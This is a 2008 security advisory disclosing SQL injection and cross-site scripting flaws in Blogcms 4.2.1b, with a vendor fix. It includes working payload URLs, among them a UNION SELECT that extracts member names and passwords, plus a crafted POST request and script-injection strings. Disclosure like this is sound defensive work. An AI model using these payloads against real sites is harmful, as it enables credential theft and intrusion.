@@ -1,0 +1,119 @@
+Digital Security Research Group [DSecRG] Advisory       #DSECRG-08-003
+
+
+Application:                    Blogcms
+Versions Affected:              Blogcms 4.2.1b
+Vendor URL:                     http://blogcms.com/
+Bugs:                           SQL Injestions, SiXSS, XSS
+Exploits:                       YES
+Reported:                       15.01.2008
+Vendor response:                16.01.2008
+Date of Public Advisory:        16.01.2008
+Authors:                        Alexandr Polyakov, Stas Svistunovich
+                                Digital Security Reasearch Group [DSecRG] (research [at] dsec [dot] ru)
+
+
+
+Description
+***********
+
+Blogcms system has multiple security vulnerabilities:
+
+1. Multiple SQL Injections
+2. Multiple Linked XSS
+3. Multiple Linked SiXSS
+
+
+
+Details
+*******
+
+1. Multiple  SQL Injection vulnerabilities
+
+
+1.1 Attacker can inject SQL code in index.php. Parameter name "blogid"
+
+
+Example:
+
+http://[server]/[installdir]/index.php?query=asd&blogid=1,1)+union+select+1,2,user(),database(),mname,6,7,8,9,10,11,mpassword,13,14,15+from+nucleus_member/*
+
+
+
+1.2 Attacker can inject SQL code in module /blogcms/action.php. POST parameter name "user"
+
+
+Example:
+
+POST /blogcms/action.php HTTP/1.0
+Cookie: DokuWiki=g8m41hncjkfjkc4sb1lvmgbiu5
+Content-Length: 139
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; DS; .NET CLR 2.0.50727)
+Host: 192.168.40.33
+Pragma: no-cache
+Connection: Keep-Alive
+
+action=addcomment&url=http%3A%2F%2F192.168.40.33%2Fblogcms%2F%3Fitem%3Dblog-cms-4-2-1&itemid=1&body=asd&&userid=asd&x=42&y=13&user=asd'+[DSecRG_INJECTION]
+
+-------------------------------------------------------------------------------
+
+
+2. Multiple Linked XSS vulnerabilities
+
+
+Linked XSS vulnerability found in  /photo/admin.php and /photo/index.php  attacker can inject XSS script in URL
+
+
+Example:
+
+http://[server]/[installdir]/photo/admin.php/"><script>alert('DSECRG_XSS')</script> 
+
+http://[server]/[installdir]/photo/index.php/"><script>alert('DSECRG_XSS')</script> 
+
+-------------------------------------------------------------------------------
+3. Multiple SiXSS (XSS throught SQl Injection Error) vulnerabilities
+
+
+3.1 Linked SiXSS vulnerability found in index.php, attacker can inject XSS code in SQL Error 
+
+Example:
+
+http://[server]/[installdir]/index.php?query=asd&amount=0&blogid=1'<script>alert('DSecRG_XSS')</script>;&x=34&y=6
+
+
+
+3.1 Linked SiXSS vulnerability found in /admin/plugins/table/index.php, attacker can inject XSS code in SQL Error 
+
+It is also a SQL injection but because it is in admin panel it is not critical.
+
+
+Example:
+
+http://[server]/[installdir]/admin/plugins/table/index.php?action=edittemplate&field=title'<script>a=/DSecRG XSS/%0d%0aalert(a.source)</script>&id=2&text=0
+
+-------------------------------------------------------------------------------
+
+
+
+Fix Information
+***************
+
+Blogcms was altered to fix this flaw on 16.01.2008. Updated version (4.2.1.c) can be downloaded here:
+                
+                http://blogcms.com/?item=download
+
+Changelog:      http://blogcms.com/wiki/changelog
+
+
+
+About
+*****
+
+Digital Security is leading IT security company in Russia, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on web application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsec [dot] ru
+                http://www.dsec.ru (in Russian)
+
+# milw0rm.com [2008-01-16]
